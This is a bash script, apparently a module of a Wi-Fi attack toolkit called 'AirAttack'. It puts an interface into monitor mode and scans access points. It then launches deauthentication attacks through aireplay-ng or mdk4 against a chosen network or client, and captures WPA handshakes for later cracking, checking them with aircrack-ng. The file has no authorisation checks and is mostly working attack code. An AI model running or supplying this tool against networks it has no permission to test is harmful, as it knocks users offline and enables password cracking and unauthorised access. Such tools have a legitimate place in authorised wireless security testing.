#!/bin/bash

create () {

 # ══════════════════════════════════════════════════════
 #Creating Virtual Monitor INTERFACE
 # ══════════════════════════════════════════════════════
	cleanup
	
    info "Creating virtual monitor interface $INTERFACE on $INTER...\n"
    if 
        sudo iw dev "$INTER" interface add "$INTERFACE" type monitor; then
        sudo ip link set "$INTERFACE" up
        echo -e "${GREEN}$INTERFACE ready ${NC}"
    else
        err "Could not create $INTERFACE — is $INTER available?"
        printf "${RED}Check: iw dev ${NC}"
        exit 1
    fi

    read -p "Press [Enter] key to continue..."
}

delete () {

    # ══════════════════════════════════════════════════════
    #Deleting Virtual Monitor if avilable
    # ══════════════════════════════════════════════════════
    cleanup
    
    read -p "Press [Enter] key to continue..."
}


wifi_scan () {

  mon_checker || return 1

 #    ip link show "$INTERFA" >/dev/null 2>&1 && { #Deletes wlan1 if avilable for only pmkid
 #    sudo ip link set "$INTERFA" down 2>/dev/null
 #    sudo iw dev "$INTERFA" del 2>/dev/null
 #    }

	warn "Press Ctrl+C here to stop scan"
 # ══════════════════════════════════════════════════════
 #Scanning Process
 # ══════════════════════════════════════════════════════
  rm -f scan-* 2>/dev/null 
  
	read -rp "$(printf "${PURPLE} Scanning Time... ${NC}\n")" sec
	
    if [[ -z $sec || ! $sec =~ ^[0-9]+$ || $sec -eq 0 ]]; then
		err "Scan time must be a number greater than 0"
		read -rp "$(printf "${DIMMER}Press [Enter] key to continue...${NC}")"
		return 1
    fi
    
    xterm -bg black -fg cyan -title "WiFi Scan" -e "airodump-ng $INTERFACE --write scan --output-format csv & PID=\$!; sleep $sec; kill -TERM \$PID; sleep 2; kill -9 \$PID 2>/dev/null" &
    
    SCAN_PID=$!
    wait $SCAN_PID #this make the script for 15 sec
    printf "${GREEN}Scan Finished${NC}\n"

 # ══════════════════════════════════════════════════════
 #Selection Part
 # ══════════════════════════════════════════════════════
	python3 "$SCRIPT_DIR/Modules/parse_scan.py" scan-01.csv > /tmp/scan_results.txt

	

# It was weak so instead placed with python
 #-F',' is setting seperator as comma and become colomn,,NR-numberline and >2 means leave these 2 lines,,$4 !~ /-/ — skip any line where column 4 contains a -,,,count ++ create numbers and extra + is to add one 
 #sed 's/\x1b\[[0-9;]*m//g' — strips all color escape codes before saving to the file, so $ap and $ch are clean when extracted.;;;%d — prints the number,,%s — prints the field value,,\033[1;31m — RED color (same as your $RED variable, but awk can't use bash variables directly),,, >  /tmp/scan_results.txt saves the output data and from where the read selectionis done
   #	cat /tmp/scan_results.txt
   scan_check

    read -rp "$(printf "${PURPLE}${BOLD}Select target (1-$(wc -l < /tmp/scan_results.txt)): ${NC}")" PICK #(wc -l < /tmp/scan_results.txt)this part tell the output terminal how many bssid are available

	IFS=',' read -r ap ch <<< "$(python3 "$SCRIPT_DIR/Modules/pick_ap.py" /tmp/scan_results.txt "$PICK")"

 # ══════════════════════════════════════════════════════
 #checking Part
 # ══════════════════════════════════════════════════════

    if [[ -n $ap ]]; then
        printf "${GREEN} AP Selection Successful ${NC}\n"
    else
        printf "${RED} AP Selection Failed ${NC}\n"
        return 1
    fi

        if [[ -n $ch ]]; then
        printf "${GREEN} Channel Selection Successful ${NC}\n"
    else
        printf "${RED} Channel Selection Failed ${NC}\n"
        return 1
    fi
    rm /tmp/scan_results.txt 2>/dev/null 
    read -rp "$(pre "Press [Enter] key to continue...")"
}

scan_check () {
	
	if [[ -f /tmp/scan_results.txt ]]; then
		 cat /tmp/scan_results.txt
	else 
		err "Scan file not created try again"
		return 1
	fi
}

wifi_deauth () {

 if [[ -z $ap ]]; then
         err "Run Target Scan First"
 else
    
    printf "${PURPLE}${BOLD} Starting... ${NC}\n"
    
    mon_checker || return 1 #|| means "if the left side fails, do the right side" — so if mon_checker returns 1 (failure), it immediately does return 1 and exits the function.
    sudo iw dev "$INTERFACE" set channel "$ch"
    # xterm=open new terminal,,,-e = to run command in terminal,,,& — run in background so your main script continues;;;; bash — after the command finishes (or errors), drops into a bash shell keeping the window open so you can see the output/error.
    #read -rp expects a string as the prompt, not a command. So you use $() to convert the printf output into a string first.
    
    #-z = zero length (empty)
    #-n = non zero length (has data)
    #rempve bash and exit if any error occur in xterm terminal
    
    while true; do
		info "-----Make Choice-----"
		into "1) Aireplay Attack"
		into "2) MDK4 Attack (No Client Mac Needed)"
		into "0) Back"
		warn "Press Ctrl+C here to stop"
    
		read -p ">>	" choice
		
		case $choice in 
		
			1) read -rp "$(printf "${MAGENTA}Deauth client  (Enter MAC of client\n\t\tFor all leave empty): ${NC}\t")" cp
				read -rp "$(printf "${MAGENTA}Deauth Packets Numbers(0 for infinite): ${NC}\t")" pac
				if [[ -z $pac ]]; then
					printf "${RED}Number of packets is not selected ${NC}\n"
					continue
				fi
				
				if [[ -z $cp ]]; then
					xterm -bg black -fg red -title "Deauth Attack" -e "aireplay-ng --deauth $pac -a $ap $INTERFACE --ignore-negative-one; bash, exit" &
				else
					xterm -bg black -fg red -title "Deauth Attack" -e "aireplay-ng --deauth $pac -a $ap -c $cp $INTERFACE --ignore-negative-one; bash, exit" &
				fi
				;;
			
			2)	read -rp "$(printf "${MAGENTA}Deauth duration in seconds: ${NC}\t")" dur
				xterm -bg black -fg red -title "Deauth Attack" -e "timeout $dur mdk4 $INTERFACE d -B $ap -c $ch; bash, exit" &
				;;	
			
			0) break ;;
				
			*) err "Wrong Choice "
				read -p "Press [Enter] key to continue..." 
				continue ;;	
		esac
    done
    
 fi
    read -p "Press [Enter] key to continue..."
}


wifi_handshake () {

 if [[ -z $ap ]]; then
        err "Run Target Scan First"
 else

    printf "${PURPLE} Capturing... ${NC}\n"
    
 handshake_check    

    #-w handshake — save capture to handshake-01.cap,,,--output-format pcap — save as pcap format (needed for cracking later)
    mon_checker || return 1
    read -rp "$(printf "${MAGENTA}Deauth client  (Enter MAC of client or For all leave empty): ${NC}\t")" cp
    sudo iw dev "$INTERFACE" set channel "$ch"
    
    

    read -p "Press [Enter] key to continue..."  
    
    pp "1) Aireplay"
    pp "2) MDK4 (Best)"
    warn "Please Dont Press Ctrl+C here"
    read -rp "$(info "Attack Mode ")" mode

if [[ $mode = 1 ]]; then
    if [[ -z $cp ]]; then
        xterm -bg black -fg green -title "Handshake Capture" -e "airodump-ng --bssid $ap -c $ch -w handshake --output-format pcap $INTERFACE & PID=\$!; sleep 40; kill -9 \$PID; bash, exit" &
        xterm -bg black -fg red -title "Deauth Attack" -e "timeout 25 aireplay-ng --deauth 0 -a $ap $INTERFACE --ignore-negative-one; bash, exit" &
        
    else
        xterm -bg black -fg green -title "Handshake Capture" -e "airodump-ng --bssid $ap -c $ch -w handshake --output-format pcap $INTERFACE & PID=\$!; sleep 40; kill -9 \$PID; bash, exit" &
        xterm -bg black -fg red -title "Deauth Attack" -e "timeout 25 aireplay-ng --deauth 0 -a $ap -c $cp $INTERFACE --ignore-negative-one; bash, exit" &
     fi
     
elif [[ $mode = 2 ]]; then
		xterm -bg black -fg green -title "Handshake Capture" -e "airodump-ng --bssid $ap -c $ch -w handshake --output-format pcap $INTERFACE  & PID=\$!; sleep 40; kill -9 \$PID; bash, exit" &
		xterm -bg black -fg red -title "Deauth Attack" -e "timeout 25 mdk4 $INTERFACE d -B $ap -c $ch; bash, exit" &

else 
	err "Wrong Choice"
	return 1
	
fi
    sleep 2
    read -rp "$(printf "${MAGENTA}Press Enter to verify handshake...${NC}")"
    
    if 
        aircrack-ng handshake* 2>&1 | grep -q "1 handshake"; then
        printf "${GREEN}Handshake captured successfully!${NC}\n"
    else
        printf "${RED}No handshake* found — try again${NC}\n"
        printf "${RED}No Handshake Found Removing File 'handshake-01.cap' ${NC}\n"
        rm handshake*
	fi
   fi  
    read -p "Press [Enter] key to continue..."
 #grep -q "1 handshake" — silently checks if the output contains that string, returns true/false.

}

wifi_pmkid () {
    info " PMKID tool not available...\n"
 #    printf "${PURPLE} PMKID Capturing... ${NC}\n"

 # ══════════════════════════════════════════════════════
 #Deleting and creating new wlan1
 # ══════════════════════════════════════════════════════
 #   printf "${RED}Deleting monitor interface $INTERFACE... ${NC}"
 #    ip link show "$INTERFACE" >/dev/null 2>&1 && {
 #   sudo ip link set "$INTERFACE" down 2>/dev/null
  #  sudo iw dev "$INTERFACE" del 2>/dev/null
   # }

    #printf "${MAGENTA}Creating interface $INTERFA.....${NC}\n"
    #if 
    #    sudo iw dev "$INTER" interface add "$INTERFA" type managed; then
    #    sudo ip link set "$INTERFA" up
    #    sudo nmcli dev set $INTERFA managed no  # ← tell NM(Network Manager) to leave wlan1 alone
    #    echo -e "${GREEN}$INTERFA ready ${NC}"
    #else
    #    printf "${RED}Could not create $INTERFA — is $INTER available? ${NC}"
    #    printf "${RED}Check: iw dev ${NC}"
    #   return 1
    #fi

 #--filterlist_ap=$ap — target only your AP;;;--filtermode=2 — whitelist mode (only capture specified AP);;;-w pmkid.pcapng — save output file
    #xterm -bg black -fg cyan -title "PMKID Capture" -e "hcxdumptool -i ${INTERFA} -c ${ch}a -w pmkid.pcapng --exitoneapol=1; bash" &
 read -p "Press [Enter] key to continue..."
}


# ══════════════════════════════════════════════════════════════════════════════
#      WIFI MENU LOGIC
# ══════════════════════════════════════════════════════════════════════════════

wifi_menu() {
    while true; do
        clear
        print_banner
        show_target

        printf "${DIM}══════════════════════════════════════════════════════${NC}\n"
        printf "${GREEN}${BOLD}              RECONNAISSANCE             ${NC}\n"
        printf "${DIM}══════════════════════════════════════════════════════${NC}\n"

        printf "${ORANGE}1. Switch to Monitor Mode${NC}\n"
        printf "${ORANGE}2. Switch to Managed Mode${NC}\n"
        printf "${ORANGE}3.🔍 Target Scan(Monitor Mode Required) ${NC}\n"
        info "For The IP Of The Target Use Scan Bettercap"

        printf "${DIM}══════════════════════════════════════════════════════${NC}\n"
        printf "${RED}${BOLD}               ATTACK             ${NC}\n"
        printf "${DIM}══════════════════════════════════════════════════════${NC}\n"

        printf "${GREEN}4.☠️ Deauth Attack ${NC}\n"
        printf "${GREEN}5.🫱🏻‍🫲🏿 HandShake Capture (Wait 1 min) ${NC}\n"
        printf "${GREEN}6.🫣 PMKID Capture ${NC}\n"

        printf "${DIM}══════════════════════════════════════════════════════${NC}\n"
        printf "${YELLOW}${BOLD}               Main Menu             ${NC}\n"
        printf "${DIM}══════════════════════════════════════════════════════${NC}\n"

        printf "${RED}0.🔙 Main Menu ${NC}\n"

    read -rp " $(printf "${BOLD}Choose Option(0-6) ==> ${NC}")" wifi

    case $wifi in 
        1) wlan_checker
			create;;
        2) delete;;
        3) wifi_scan;;
        4) wifi_deauth;;
        5) wifi_handshake;;
        6) wifi_pmkid;;
        0) if ! ip link show "$INTERFACE" >/dev/null 2>&1; then  #! — negates the condition [[ this part]], so if wlan0mon does not exist → print error and return.
			info "Exiting AirAttack"
			#sleep 2
			break
		   else
				read -rp "$(printf "${MAGENTA} Want Persistant Monitor Mode (y/n)::\t ${NC}")" yes
				if [[ $yes = y ]]; then
					break
				else
					cleanup 
				break
					fi	
			fi ;;

			
		*) read -rp "$(printf "${RED}Choose correct option [ENTER]${NC}")"

    esac
done
}
